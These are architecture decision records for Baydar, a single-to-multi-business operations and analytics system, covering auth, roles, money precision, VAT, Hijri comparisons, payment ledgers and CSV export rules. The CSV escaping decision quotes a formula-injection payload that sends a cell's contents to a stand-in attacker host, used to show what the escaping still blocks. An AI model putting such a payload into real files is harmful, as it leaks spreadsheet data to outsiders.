# Baydar — Architecture Decision Records

Every decision where a reasonable engineer could have chosen differently. Each records the
alternatives, the reasoning, the cost accepted, and what would make it worth revisiting.

Status: **Accepted** decisions govern Phase 01 onward and can be overturned by the project
owner. **Open** decisions need an answer before the phase that depends on them.

---

## ADR-001 — Single-business, not multi-tenant

**Status:** Superseded by ADR-023 (2026-09): the external sale this was waiting for is now
the plan.
**Affects:** Every table, every query, every test

**Decision.** Baydar serves one business per installation. There is no `businesses` table
and no tenant column.

**Alternatives.**

1. *Multi-tenant with `business_id` on every table.* Adds a column, an index and a global
   scope to nineteen tables, plus tenant-scoping middleware, cross-tenant IDOR tests on
   every endpoint, and tenant-aware seeding. That work is real and lands on every future
   feature, not just once.
2. *Database-per-tenant.* Operationally heavy — migration orchestration across N databases,
   connection switching — and wholly unjustified at this scale.
3. *Single-business.* Chosen.

**Reasoning.** The product is an internal operations system for one company's staff.
Multi-tenancy serves a business model Baydar does not have. Building it now would mean
paying for isolation that nothing uses, and every over-engineering rule in the brief points
the same way.

**Cost accepted.** Retrofitting is not free: one migration per table to add `business_id`,
a backfill to a default business, an Eloquent global scope, and a sweep of every raw
aggregate query. Estimated at several days, and it must happen before a second customer,
not after.

**Mitigation.** `business_settings` already isolates per-business configuration
(currency, timezone, fiscal year), so the concept has a home. Queries go through model
scopes rather than scattered raw SQL, which is what makes a global scope a viable retrofit.

**Revisit when:** a second business must share one deployment.

---

## ADR-002 — Sanctum SPA cookie authentication, not JavaScript-held tokens

**Status:** Accepted
**Affects:** Auth flow, deployment topology, frontend rendering model

**Decision.** Laravel Sanctum in stateful SPA mode. The frontend and API are served from
sibling subdomains of a shared parent domain; the session lives in an HttpOnly cookie.

**Alternatives.**

1. *Sanctum API tokens in `localStorage`.* Simple, no domain constraint — and readable by
   any successful XSS. A stolen bearer token is a portable, long-lived credential. Rejected.
2. *Bearer tokens proxied through Next.js route handlers (BFF).* The token lives in a
   Next-set HttpOnly cookie and never reaches browser JavaScript. Genuinely secure, removes
   the shared-domain requirement, and enables server-side data fetching. Rejected for the
   MVP because it means a second server-side hop to build, deploy, test and debug, with
   two auth mechanisms to keep in step.
3. *Sanctum SPA cookie mode.* Chosen.

**Reasoning.** Option 3 gives the same XSS resistance as option 2 with one authentication
mechanism instead of two, and it is the path Laravel documents and supports best.

**Cost accepted.**

- ~~Local development needs hosts-file entries (`app.opsight.test`, `api.opsight.test`).~~
  **Revised in Phase 01: not true.** Cookies ignore port numbers, so `localhost:8000` and
  `localhost:3000` already share a cookie domain. Local setup needs `SESSION_DOMAIN=localhost`
  and `SANCTUM_STATEFUL_DOMAINS=localhost:3000` and nothing else — no hosts file, no
  administrator rights. This removed the main practical objection to this ADR.
- Production still requires both apps under one parent domain, which constrains deployment.
- **Authenticated data is fetched client-side**, so Server Components render the shell but
  not the data (FRONTEND_ARCHITECTURE.md §2). This one held.

**Verified in Phase 01** over real HTTP, end to end: CSRF cookie issued (204), login (200)
setting an HttpOnly session cookie, `/me` authenticated by that cookie alone (200), an unsafe
request without the CSRF header rejected (419), logout (204), and `/me` afterwards (401).
Covered by automated tests at both the feature and browser level.

**Revisit when:** server-side rendering of authenticated data becomes a requirement — a
public shared report link, or a hard SEO/first-paint need. Option 2 is then the move, and
it is additive rather than a rewrite.

---

## ADR-003 — Roles in code, not in the database

**Status:** Accepted
**Affects:** Schema, authorization layer

**Decision.** Four fixed roles in a PHP enum, with a single registry mapping role to
abilities. No `roles`, `permissions` or `role_user` tables.

**Alternatives.**

1. *`spatie/laravel-permission`.* Excellent package, database-backed, runtime-editable.
   Brings three tables, cached permission loading, and an admin UI to build before anyone
   can use it.
2. *Hand-rolled `roles`/`permissions` tables.* All of the above cost, less maturity.
3. *Code registry.* Chosen.

**Reasoning.** The MVP's roles are closed and product-defined. Ability changes are product
decisions that should be code-reviewed and diffable, not database rows that change without
a trace. The registry is also the single source of truth the frontend reads via `/me`.

**Cost accepted.** Changing an ability requires a deploy. For a fixed four-role product,
that is desirable friction rather than a limitation.

**Mitigation.** Code checks `can('expenses.view')`, never `role === 'manager'`
(ROLES_AND_PERMISSIONS.md §5.7). Because every check already goes through abilities,
swapping the registry's backing store for database rows is a single-file change.

**Revisit when:** a customer needs custom roles or a per-user ability override.

---

## ADR-004 — Monorepo with `backend/` and `frontend/`

**Status:** Accepted
**Affects:** Repository layout, CI, deployment

**Decision.** One repository containing both applications and the documentation.

**Alternatives.**

1. *Two repositories.* Clean separation, independent CI and versioning — and an API contract
   change becomes two pull requests in two repositories that must merge in the right order.
   Every cross-cutting change gets that overhead.
2. *Monorepo with a JavaScript workspace tool (Turborepo, Nx).* Useful when packages are
   shared between JavaScript applications. Here there is exactly one JavaScript application
   and one PHP application; the tool would manage nothing.
3. *Plain monorepo, two independent toolchains.* Chosen.

**Reasoning.** The API contract is the highest-churn boundary in the project. Keeping both
sides in one commit means a contract change and its client update are reviewed together and
can never ship half-deployed. For a portfolio project it also means one link tells the whole
story.

**Cost accepted.** CI must path-filter so a frontend change does not run the PHP suite
(TESTING_STRATEGY.md §8). Deployment targets differ per directory. Both are handled once,
in configuration.

**Revisit when:** the two applications acquire genuinely independent release cycles and
separate teams.

---

## ADR-005 — Order-level refunds in the MVP, no refund ledger

**Status:** Superseded by ADR-022 (2026-09). The two columns remain, as running totals
beside a ledger.
**Affects:** `orders` schema, Net Revenue, Units Sold

**Decision.** `orders.refunded_amount` and `orders.refunded_at`. One refund per order, full
or partial. No `order_refunds` table.

**Alternatives.**

1. *`order_refunds` ledger with line references.* Supports multiple partial refunds,
   attributes refunds to their issue date, and enables unit-level refund accounting. Needs
   a table, a service, UI, and a decision about which period a refund belongs to.
2. *Boolean `is_refunded`.* Cannot express a partial refund at all. Rejected.
3. *Two columns on `orders`.* Chosen.

**Reasoning.** Two columns cover the common case at near-zero cost. A ledger is the correct
end state but is not what makes the MVP valuable.

**Cost accepted, stated plainly.**

- A second refund on the same order cannot be recorded without overwriting the first.
- Refunds reduce the period the order was **placed** in, so a closed period's revenue can
  move when a late refund is recorded (METRICS.md §2.2).
- Units Sold is not reduced by refunds, because there is no line-level refund data
  (METRICS.md §2.4).

**Revisit when:** multiple partial refunds, or refund-date-based reporting, is needed.

---

## ADR-006 — Single stock location

**Status:** Accepted
**Affects:** `inventory_items`, `inventory_movements`

**Decision.** One stock location. `inventory_items` has one row per product, enforced by
`UNIQUE(product_id)`.

**Alternatives.** A `locations` table with per-location stock rows and inter-location
transfer movements. That brings location selection into order confirmation, a transfer
workflow, per-location low-stock thresholds and location-aware analytics — a module, not a
column.

**Reasoning.** Out of MVP scope, and it would touch every inventory surface.

**Mitigation.** The migration is small and known: drop `UNIQUE(product_id)`, add
`location_id`, add `UNIQUE(product_id, location_id)`, add `location_id` to movements,
backfill a default location. Keeping stock in its own table rather than as columns on
`products` is what makes that migration small.

**Revisit when:** a second stock location exists.

---

## ADR-007 — Stock is checked at confirm; no backorders

**Status:** Accepted
**Affects:** Order confirmation, inventory

**Decision.** Confirming an order whose lines exceed available stock fails with 409. Stock
is checked and decremented in one locked transaction at confirm time.

**Alternatives.**

1. *Allow negative stock (backorders).* Real for businesses that sell ahead of supply, but
   it changes the meaning of "stock on hand", needs a fulfilment queue and allocation rules,
   and removes the `CHECK (stock_on_hand >= 0)` safety net.
2. *Reserve stock when a draft is created.* Requires reservation expiry, abandoned-draft
   cleanup, and a reserved-versus-available distinction throughout the UI.
3. *Check and decrement at confirm.* Chosen.

**Reasoning.** The simplest model that is always internally consistent: stock on hand means
physical stock, and it is never negative.

**Cost accepted.** Two users can both build drafts for the last unit; the second fails at
confirm. That is a visible, well-explained failure rather than a silent oversell.

**Mitigation.** `inventory_items.reserved_quantity` exists in the schema, always 0 in the
MVP, so option 2 can be added without a migration.

**Revisit when:** users regularly hit the confirm-time failure, or the business genuinely
sells ahead of stock.

---

## ADR-008 — Flat categories

**Status:** Accepted
**Affects:** `categories`, breakdown analytics

**Decision.** One level. No `parent_id`.

**Alternatives.** Adjacency list (recursive queries for rollups), nested set (fast reads,
painful writes), or materialized path. Each also requires deciding whether a parent's
revenue includes its children's — a question that changes every breakdown, chart and export.

**Reasoning.** Hierarchy multiplies the complexity of aggregation, which is the product's
core. A flat list covers small-business catalogs.

**Revisit when:** a real catalog needs grouping beyond one level. Adjacency list plus
recursive CTEs is the path; MariaDB 10.4 supports them.

---

## ADR-009 — No pre-aggregation in the MVP

**Status:** Accepted
**Affects:** Metric layer, performance

**Decision.** Every metric is computed live from L0. No `daily_metrics` rollup table.

**Alternatives.**

1. *Nightly rollup table.* Fast dashboards, at the cost of staleness, a rebuild job,
   dirty-day invalidation for backdated entries, and a second place where a metric is
   defined — which is the real danger.
2. *Materialized views.* Not available in MySQL or MariaDB.
3. *Live computation with good indexes.* Chosen.

**Reasoning.** At realistic small-business volume — tens of thousands of orders — indexed
aggregation is fast. Pre-aggregating before measuring is optimising a problem that may not
exist, and it risks the correctness the whole product rests on.

**Trigger to implement.** Dashboard p95 above 500 ms on the seeded dataset. That dataset
exists specifically so this is a measurement, not a guess.

---

### MEASURED IN PHASE 04 — verdict: NOT WARRANTED

Dataset: 2,277 orders, 5,520 line items, 6,352 stock movements, 36 months.

The naive measurement said the trigger was met, and it was wrong. Measuring the endpoints
over HTTP gave a dashboard p95 of 774 ms — comfortably past 500 ms, and an apparently clear
mandate to build the rollup table.

Two further measurements showed that conclusion was an artefact:

| What was measured | Result |
| --- | --- |
| Dashboard summary, called directly (no HTTP, no framework boot) | **86 ms**, 16 queries |
| `GET /health` over HTTP — no auth, no database, no work at all | **561 ms** |
| `GET /dashboard` over HTTP | 664 ms |
| **Attributable to the analytics work** | **~103 ms** |

`php artisan serve` is a single-threaded PHP dev server with no opcache. Its fixed
per-request cost on this machine is roughly 560 ms, and that is what the first measurement
was mostly recording. The confirmation: after a change that provably cut the summary from
52 queries to 16, the HTTP figures got *worse* — noise, not signal.

**So the rollup table is not built.** It would introduce staleness, a rebuild job,
dirty-day invalidation for backdated entries, and a second place where a metric is defined,
in order to fix roughly 100 ms that is already well inside budget.

**What the measurement did find** was a real problem the rollup would have masked: the
metric methods derived from each other — `netMargin → netProfit → grossProfit → netRevenue`,
and `grossMargin → netRevenue` again — so `netRevenue` was queried six times per period and
a single summary issued **52 queries**. Consolidating the order-level totals into one
memoised aggregate per period cut that to 16, and the three-year summary from 181 ms to
80 ms. That fix costs no staleness and creates no second definition.

**Caveat, stated plainly.** 561 ms of the measurement is the dev server, so the absolute
HTTP numbers here say nothing about production. What they do establish is the *shape*: the
application's own cost is ~100 ms at this data volume, and the trigger is not met. The
figure should be re-measured on php-fpm with opcache before deployment, and again at ten
times the data.

**Binding constraints if adopted.** A rollup is a **cache, not a record**: fully
reconstructible from L0 by one command; a test asserting rebuilt values equal live-computed
values; backdated writes mark affected days dirty. The metric definition stays in one place.

---

## ADR-010 — Rule-based insights, no anomaly detection

**Status:** Accepted
**Affects:** L3 insights

**Decision.** Insights are explicit threshold rules (METRICS.md §4). No statistics, no
models.

**Alternatives.** Z-score or IQR outlier detection on daily series; seasonal decomposition;
forecasting. All need enough history to be meaningful, all produce false positives on small
retail data, and none can explain themselves in a sentence a manager will act on.

**Reasoning.** Deterministic rules are testable, explainable and trustworthy. "Margin fell
4.2 pp because COGS rose 18%" is more useful than "anomaly detected, confidence 0.83".

**Revisit when:** there are two or more years of dense history and users ask for
detection rather than thresholds.

---

## ADR-011 — Database queue driver, no Redis

**Status:** Accepted
**Affects:** Queues, caching, rate limiting, deployment

**Decision.** `database` for queues and cache in the MVP.

**Reasoning.** The MVP has no queued jobs — exports are synchronous and row-capped. Adding
Redis now means a service to run, configure, secure and monitor for a feature that does not
exist. Laravel's driver abstraction makes the switch a configuration change.

**Revisit when:** the first real background job ships, or the cache becomes hot enough for
database contention to show. Redis then also improves rate limiting across multiple
application instances.

**Crossed (2026-10), partly.** ADR-026's audit-log value sweep brought the trigger into
sight; ADR-027 crossed it. Webhook deliveries are handled by a queued job, because the
provider is waiting on the response and retries a slow one — which is how an importer
produces two of the same order. Deployment now needs `queue:work` as well as the
scheduler's cron.

What has NOT changed: exports are still synchronous and row-capped, and the erasure sweep
is still synchronous. Those move to the queue when something measured says they should,
not because a queue now exists.

---

## ADR-012 — No client-side schema validation library

**Status:** Accepted
**Affects:** Frontend forms

**Decision.** `react-hook-form` for form state; the server's 422 response is the source of
validation truth. No Zod, Yup or Joi.

**Reasoning.** A client schema duplicates rules that already exist as Laravel FormRequests,
and the two drift. Worse, the client copy is the one that looks authoritative to whoever is
writing the form. One definition, on the server, with the client rendering its errors.

Zod is additionally TypeScript-first; its main advantage — inferred static types — is
unavailable in a JavaScript-only project, so the cost/benefit is worse here than usual.

**Cost accepted.** A round trip for full validation feedback. Mitigated by inline
required/format checks for immediate response, and by the API being local-fast.

**Revisit when:** a form is complex enough that round-trip latency genuinely harms the
experience — a multi-step wizard, for instance.

---

## ADR-013 — Shipping and tax excluded from revenue

**Status:** Accepted
**Affects:** Net Revenue, Gross Margin, every profit metric

**Decision.** Net Revenue excludes both `tax_amount` and `shipping_amount`.

**Reasoning.**

- **Tax** is collected for a tax authority. It is a liability, not earnings. Including it
  inflates revenue and destroys margin comparability. This is not debatable.
- **Shipping** is genuinely debatable. A business charging shipping at cost is recovering an
  expense; a business charging a margin on shipping is earning revenue. Baydar treats it as
  cost recovery, because the alternative inflates revenue for every business that does not
  profit on delivery, and because shipping cost is not modelled — counting the income
  without the cost would overstate profit.

**Cost accepted.** Businesses that profit on shipping will see revenue understated.

**Mitigation.** `shipping_amount` is stored on every order, so the definition can change
without data loss. The change is one line in the Net Revenue metric plus its tests.

**Revisit when:** shipping cost is modelled, or a user reports the understatement.

---

## ADR-014 — Inventory Turnover deferred; Stock Coverage instead

**Status:** Accepted
**Affects:** Inventory metrics

**Decision.** Inventory Turnover is not in the MVP. Stock Coverage in days ships instead
(METRICS.md §2.19).

**Reasoning.** Turnover needs average inventory *value* over the period, which needs
historical stock valuation, which needs a costing method (FIFO or weighted average) the MVP
has not chosen. Approximating with current inventory value produces a number that is wrong
whenever stock levels moved — which is always — and looks perfectly plausible while being
wrong. That is the exact failure mode this project is designed to avoid.

**Mitigation.** `inventory_movements.unit_cost` is recorded on restocks, so the cost basis
for a future valuation is already being captured.

**Revisit when:** a costing method is chosen and daily valuation snapshots exist.

---

## ADR-015 — `DECIMAL` for money, not integer minor units

**Status:** Accepted
**Affects:** Every money column, every aggregate

**Decision.** `DECIMAL(15,4)` for unit amounts, `DECIMAL(15,3)` for totals, rounded to the
currency's own decimal places. Money crosses the API as a string, at those places.

> **Amended 2026-09.** Totals were `DECIMAL(15,2)` and every calculation used two places,
> while `currency_decimals` reached only the display. That silently dropped the third decimal
> of BHD — the product's default — and of KWD, OMR and JOD. Totals are now `DECIMAL(15,3)`,
> enough for any accepted currency (0–3 places). Every rounding, sum and comparison takes its
> scale from `App\Support\Money::scale()`, and `App\Casts\CurrencyAmount` replaces the
> fixed `decimal:2` cast. `tests/Feature/Orders/CurrencyPrecisionTest.php` fails if any of
> this regresses.

**Alternatives.**

1. *`BIGINT` minor units (cents).* Immune to decimal representation issues and the common
   choice in payment systems. But every aggregate needs conversion on the way out, unit
   costs below one cent need a scale factor anyway, and raw SQL aggregates become harder to
   read and verify by hand — which matters for a system whose correctness is checked against
   hand calculations.
2. *`FLOAT`/`DOUBLE`.* Never. Not a real alternative.
3. *`DECIMAL`.* Chosen.

**Reasoning.** `DECIMAL` is exact in MySQL and MariaDB, `SUM()` and `AVG()` stay exact, and
values are readable in the database during verification. Baydar's primary operation is
aggregation, so keeping aggregation exact and legible in SQL is worth more than integer
arithmetic's safety in application code.

**Cost accepted.** PHP and JavaScript must not cast these to floats. Controlled by: the
`CurrencyAmount` cast and `decimal:4` for unit amounts, money serialised as strings, `Intl.NumberFormat` for display, no
arithmetic on money in JavaScript, and a unit test for the whole path.

---

## ADR-016 — CSV formula escaping exempts well-formed numbers

**Status:** Accepted
**Affects:** Every export. Narrows SECURITY.md §9.6.

**Decision.** A CSV cell beginning `=`, `+`, `-`, `@`, tab or carriage return is prefixed with
an apostrophe, **unless the cell is a well-formed number**.

**The problem.** SECURITY.md §9.6, written in Phase 00, says to escape any cell beginning with
one of those characters. Applied literally in Phase 05, that escapes `-1450.00` — and every
refund, every loss, every downward stock adjustment in a financial export arrives in the
spreadsheet as TEXT. The column will not sum.

**Alternatives.**

1. *Escape everything, as written.* Faithful to the document and produces an export that does
   not do the one thing an export exists for. The predictable outcome is not that users accept
   it: it is that someone removes the escaping wholesale the first time a finance team
   complains, and then nothing is escaped.
2. *Escape only `=` and `@`.* Smaller rule, but `+1+1` and `-1+1` are both evaluated by Excel,
   so it leaves a real hole.
3. *Escape unless the cell parses as a number.* Chosen.

**Reasoning.** The security property is that no exported cell can execute as a formula. A
string that parses as a number cannot also be a formula, so exempting numbers removes nothing
from the guarantee — it is narrower in wording and identical in effect. `-1450.00` is a
number; `-1+1`, `-A1` and `-HYPERLINK("http://attacker/?d="&A1,"x")` are not, and all three
are still escaped.

**Cost accepted.** The rule now has a second clause, which is a place to be wrong. Controlled
by putting it in ONE tested predicate — `CsvCell::isNumeric`, a single explicit pattern rather
than `is_numeric`, whose acceptance of hexadecimal and leading whitespace would be exactly the
kind of edge case that turns an exemption into a hole. The test suite asserts both halves: the
formulas above are escaped, and negative money is not.

**Revisit if** an export ever needs to carry a value that is numeric to a spreadsheet but not
to this pattern — a locale using a comma as the decimal separator, for instance. The fix then
is to widen the pattern deliberately, not to drop the check.

---

## ADR-017 — In-house translation, no i18n library

**Status:** Accepted
**Affects:** Every screen, every server-written sentence. Supersedes the "localization library"
line of ROADMAP Phase 07.

**Decision.** English and Arabic are served by a translation engine of about a hundred lines
(`frontend/lib/i18n/translate.js`) over two plain dictionaries (`messages/en.js`,
`messages/ar.js`), and by Laravel's own `lang/` files on the server. No `next-intl`,
`react-i18next` or ICU message parser.

**The problem.** The product speaks exactly two languages, both known now. What a library adds
over a lookup table is plural selection, number formatting, routing by locale and message
extraction tooling. The first two are already in the platform — `Intl.PluralRules` knows Arabic
has six plural categories, and `Intl.NumberFormat` with `-u-nu-arab` writes Arabic-Indic
digits. Locale routing (`/ar/dashboard`) is wrong for this product: the language is a
preference of the signed-in person, saved on their account, not a property of a URL a
colleague might share.

**Alternatives.**

1. *next-intl.* A good library, but built around locale segments in the route; adopting it
   means restructuring `app/` for a behaviour the product does not want, and adding a
   dependency the project rule says must earn its place.
2. *react-i18next.* Heavier, and its ICU support is a second plugin.
3. *Plain dictionaries and `Intl`.* Chosen.

**Reasoning.** The genuinely hard parts are handled by the platform. What remains — nested
lookup, `{placeholder}` interpolation, choosing a plural form, emphasis tags — is small, fully
unit-tested, and has no behaviour a reader cannot see in one file.

**How it holds together.**

- The preference (`locale`, `numerals`) lives on `users`, is changed through
  `PATCH /me/preferences`, and the server answers in it (`SetLocale` middleware), so validation
  messages, insights and CSV headers match the screen.
- A cookie remembers the last choice so the server renders `<html lang dir>` correctly on the
  first byte — no left-to-right flash before the session is known.
- `tests/i18n.test.js` fails if Arabic lacks a key, uses a different placeholder, keeps an
  English sentence or writes a literal digit, or if source code asks for a key that does not
  exist. `TranslationParityTest` does the same for the server's `lang/` files.

**Cost accepted.** No extraction tooling: a new string is added to both dictionaries by hand,
and the parity test is what makes forgetting it impossible to ship.

**Revisit if** the product adds a third language, needs translator tooling, or needs
locale-addressable URLs for public pages. The dictionaries are plain objects and convert to
JSON losslessly.

---

## ADR-018 — Value-added tax: amounts stored excluding VAT, VAT snapshotted per line

**Status:** Accepted (2026-09)
**Affects:** `business_settings`, `products`, `order_items`, `orders`, `customers`,
`ConfirmOrder`, `RecordRefund`, `GET /analytics/vat`

**Context.** Until this change, tax was one number typed onto an order. No rate, nothing
per line, no VAT number anywhere. A Gulf business charging VAT (Saudi Arabia 15%, Bahrain
10%, UAE and Oman 5%) had no way to know how much of what it took belonged to the tax
authority, and had to trust whatever figure someone typed.

**Decision.**

1. **Every stored amount is EXCLUDING VAT.** Line totals, the subtotal and the order
   discount are all net of VAT, whichever way prices are written. VAT lives in its own
   columns: per line `vat_rate`, `vat_taxable_amount` and `vat_amount`, and per order
   `tax_amount` as their sum. Net Revenue has always excluded tax (ADR-013), so **no metric
   changed**. Revenue, profit, margin, AOV and the breakdowns are correct by construction.
2. **VAT is calculated at confirm and snapshotted**, like price and cost
   (`App\Domain\Tax\VatCalculation`). A rate change tomorrow cannot restate an order
   confirmed today.
3. **Prices may include or exclude VAT** (`prices_include_vat`, default: include, the
   Gulf norm). Inclusive shelf prices are converted at confirm, and the customer still pays
   exactly the shelf price.
4. **Rates.** A business rate, plus an optional per-product rate: NULL follows the
   business, 0 is zero-rated or exempt.
5. **An order-level discount reduces the VAT base.** It is shared across lines in
   proportion to their shelf amounts, with the rounding remainder on the largest line, so
   the shares sum exactly. A share never exceeds its line, so VAT can never go negative.
6. **A refund is split.** The customer's refund is divided in the order's own proportion
   of tax to total: the revenue part goes to `refunded_amount` (which Net Revenue
   subtracts), and the tax part to `refunded_vat_amount` (which it does not).
7. **Off by default.** With VAT off, confirm behaves exactly as before, including a
   typed-in tax figure. The existing test suite passes unchanged with VAT off.
8. **The report is operational, not a return.** `GET /analytics/vat` gives output VAT by
   rate, VAT refunded, and VAT due for a period, from the snapshots. Baydar records no
   purchase VAT, so there is no input VAT to reclaim. The screen says so.

**Not decided here, deliberately.**
- E-invoicing (ZATCA and others) is left to an accredited provider. Baydar will hand it
  confirmed orders — the Gulf VAT requirement the product was shaped around.
- VAT on shipping is not calculated. Shipping is outside revenue already, and the order
  form has no shipping input yet.

**Identity the tests hold.** subtotal − net discount + VAT = the shelf total less the
discount when prices include VAT, or that plus VAT when they exclude it
(`tests/Unit/Tax/VatCalculationTest.php`). End to end:
`tests/Feature/Orders/ValueAddedTaxTest.php`.

## ADR-019 — Compare by Hijri season, and say when a comparison crosses one

**Status:** Accepted (2026-09)
**Affects:** `Comparison`, `Period::comparison()`, analytics `meta`, the period selectors, the
dashboard and analytics screens

**Context.** Ramadan and the two Eids reshape trade across the region, and they move about
eleven days earlier every Gregorian year. The one year-on-year comparison Baydar had,
`previous_year`, therefore set Ramadan against ordinary trade in most years. The insights
built on it reported a collapse or a surge that was only the calendar.

**Decision.**

1. **A fourth comparison basis, `previous_hijri_year`.** The same Hijri dates one Hijri
   year earlier, under Umm al-Qura, the official calendar of Saudi Arabia. It flows through
   every metric, time series, breakdown and insight, because they all resolve comparisons
   through `Period::comparison()`.
2. **ICU, not a library.** PHP's intl extension already ships Umm al-Qura
   (`islamic-umalqura`) (`App\Domain\Calendar\HijriCalendar`). The code refuses to run
   if ICU hands back a Gregorian calendar instead, which it would otherwise do silently.
   Tests pin Ramadan and both Eids for 1445–1447 to their public dates.
3. **The server owns the calendar.** The browser does not reimplement Hijri arithmetic. It
   shows the comparison range the server reports, so there is one implementation, and two
   cannot disagree.
4. **Awareness, not just an option.** The server flags `season_mismatch` when the period
   and its comparison differ by three days or more in any season. The screen explains the
   mismatch and offers the Hijri comparison in one click. Nobody has to know the option
   exists to benefit from it.

**Accepted limitation.** Umm al-Qura is a calculated calendar. Where a country starts
Ramadan or Eid by local moon sighting, the observed first day can differ by one day. For
comparing weeks and months of trade, one day does not change a conclusion, and the
three-day threshold absorbs it.

**Not done here.** Hijri dates are not shown beside Gregorian ones on screen. `Intl` can
render them (`-u-ca-islamic-umalqura`), and it is a presentation choice to make separately.

## ADR-020 — The business week: a configurable start, and a Gulf weekend

**Status:** Accepted (2026-09)
**Affects:** `business_settings`, `TimeSeries` weekly buckets, the daily charts, the settings
screen, the demo data

**Context.** Weekly buckets always started on Monday, hard-coded in both the PHP bucket keys
and the SQL `WEEKDAY()` grouping, and nothing knew the business's days off. Across most of
the Gulf the week starts on Sunday or Saturday, and Friday and Saturday are the weekend. A
quiet Friday on a daily chart read as a drop, and the demo data put its quiet days on
Saturday and Sunday.

**Decision.**

1. **`week_starts_on`** (ISO 1–7). Every weekly bucket begins on it: the PHP keys through
   Carbon, and the SQL through `MOD(WEEKDAY(x) − (start − 1) + 7, 7)`. Both read the same
   setting, so they cannot disagree. That disagreement is the class of bug that once zeroed
   every weekly figure under Arabic. It **defaults to Monday**, so no existing weekly figure
   moves until an Owner chooses. It is listed in `affects_history`, so the settings screen
   warns before a change that moves past weeks.
2. **`weekend_days`** (ISO days, default Friday and Saturday). They change no figure. They
   shade the daily charts, so a day off reads as a day off, and the demo data places its
   quiet days on them.
3. **Shading has width.** On a chart drawn as connected points, a band from a day to itself
   draws nothing. Consecutive days off become one band, and a lone day is widened to its
   neighbour (`weekendRuns`). The same bug had kept the "incomplete period" band invisible
   since it was written, and it is fixed the same way.

## ADR-021 — Names in Arabic beside the name as entered; phones in E.164

**Status:** Accepted (2026-09)
**Affects:** `products`, `categories`, `customers`, `order_items`, their resources, the
analytics breakdowns, customer validation

**Context.** Every name was a single field. A Gulf business commonly names its products and
customers in both languages, because its staff and its customers read different ones. A
phone number was free text, so the same customer's number never matched itself, and
nothing downstream (a WhatsApp message, a duplicate check) could use it.

**Decision.**

1. **`name` stays canonical** — whatever language it was typed in — and **`name_ar` is
   optional**, on products, categories and customers. Nothing existing changes, and an edit
   round-trip through the API cannot overwrite one name with the other.
2. **The server decides what the reader sees** (`App\Support\Localization\LocalizedName`).
   An Arabic reader gets `name_ar` when there is one, and `name` otherwise. Resources send
   `display_name`. The breakdowns, top-selling products and low-stock lists select the same
   choice in SQL, so a product cannot be called one thing in a table and another in the
   chart beside it.
3. **The Arabic name is snapshotted** at confirm, beside `product_name`. Renaming a product
   later does not rewrite what an old order sold.
4. **Phones are stored in E.164** (`App\Support\PhoneNumber`), normalised on the way in:
   punctuation dropped, `00` read as `+`, a local number given the customer's country code
   with its trunk zero removed. A number that cannot be placed is refused, with a message in
   the reader's language, and never stored as typed.

**Since superseded.** This said the frontend had no product or customer edit form, so Arabic
names and phones had to be entered through the API. Both forms now exist — `ProductFormDialog`
and `CustomerFormDialog` — and each carries its own `name_ar` field with `dir="rtl"` and
`lang="ar"`, and a phone field normalised by the server.

## ADR-022 — Payments and refunds as ledgers; payment status derived

**Status:** Accepted (2026-09)
**Affects:** `orders`, new `order_payments` and `order_refunds`, `RecordRefund`,
`OrderResource`, the order list, the dashboard's quick stats, the roles matrix

**Context.** Baydar knew what an order was worth but not whether it had been paid. In the
Gulf a large share of online orders are cash on delivery, collected days after the goods
leave, and an owner's first question after "what did we sell" is "what are we still owed".
Refunds were one pair of columns (ADR-005), so a second refund overwrote the first.

**Decision.**

1. **A payments ledger.** `order_payments` has one row per payment: amount, method (cash,
   card, bank transfer, cash on delivery, wallet, other), when, an optional reference.
   Split payments and late cash-on-delivery collection are rows, not edits. A payment is
   accepted only on a committed order (confirmed, fulfilled or refunded) and never beyond
   what is outstanding. An overpayment is a conversation with the customer, not a figure.
2. **A refunds ledger.** `order_refunds` has one row per refund, split into revenue and VAT
   (ADR-018), with an optional reason. An order can be refunded in parts until nothing is
   left to return. The first refund moves a fulfilled order to `refunded`, and later refunds
   add to it.
3. **Running totals stay on the order.** `amount_paid`, `refunded_amount` and
   `refunded_vat_amount` move in the same locked transaction as each ledger row. Every
   metric already reads the order, so none changed. Tests hold each total to the sum of its
   ledger.
4. **Payment status is derived, never stored.** outstanding = max(0, total − refunded −
   paid). A refund counts against what is owed: goods returned before payment mean less to
   collect. Only a committed order has a status: *unpaid*, *partially paid* or *settled*.
   The list filters on the same formula in SQL (`PaymentStatus::outstandingSql`).
5. **Stock goes back once per order.** Without line-level refund data, "return stock" means
   every line's full quantity. `stock_returned_at` stops a second refund from shelving the
   same goods twice. The endpoint defaults `return_stock` to off once stock is back.
6. **Recording a payment is front-line work.** `orders.record_payment` is granted to Staff
   as well as Owner and Manager: the cashier and the delivery driver take the money. Money
   going back out stays supervisory, under `orders.refund`.
7. **Receivables are a quick stat** for roles with `analytics.view`: what committed orders
   owe today. Like inventory value, it is a position with no history, so no change is shown.

**Backfill.** Orders fulfilled or refunded before this change are taken as paid in full: one
payment, method "other", marked `is_backfill`, shown as "recorded before payment tracking".
Without it every historical sale would read as unpaid and receivables would be inflated by
money that was, in fact, collected. Confirmed orders not yet fulfilled start unpaid. Existing
refunds become the first row of the new ledger, with their stock taken as returned.

**Cost accepted.**

- A refund still reduces the revenue of the period the order was **placed** in (METRICS.md
  §2.2). The ledger records each refund's own date, so refund-date reporting is now
  possible, but it is not built.
- Units Sold is still not reduced by refunds: a refund has an amount, not lines.
- A mistaken payment cannot be edited or deleted; the ledger is append-only. Correcting one
  needs a reversal entry, which is not built.

**Revisit when:** line-level returns are needed, or a payment gateway starts reporting
payments on its own (they would be written through `RecordPayment`, not beside it).

## ADR-023 — Many businesses in one database, isolated by `business_id`

**Status:** Accepted (2026-09), superseding ADR-001
**Affects:** every business-owned table, the models, authentication, audit, tests

**Context.** Selling Baydar to more than one company needs one deployment to serve many
businesses, with no way for one to see another's data. It is the first item of P2 in the
market study, and the integrations after it (Salla, WhatsApp) must be built per business
from the start.

**Decision.**

1. **One database, a `business_id` column.** Database-per-business would give stronger
   isolation, but it means running migrations across N databases and switching
   connections. That is unjustified at this scale.
2. **Every owned table carries the column, NOT NULL with a foreign key.** That includes the
   children of an order (`order_items`, payments, refunds). The metric queries read those
   tables directly, and a filter that needs a join to apply is one that a query will
   eventually forget.
3. **Uniqueness becomes per business:** SKU, customer email, order reference, category slug,
   and expense category name and slug. A user's email stays globally unique, because
   sign-in is by email and must name exactly one account.
4. **The business comes from the signed-in user.** It is set by the `Authenticated` event,
   when the guard resolves the user from the session. That happens before route model
   binding, so `{order}` is looked up inside the right business from the start.
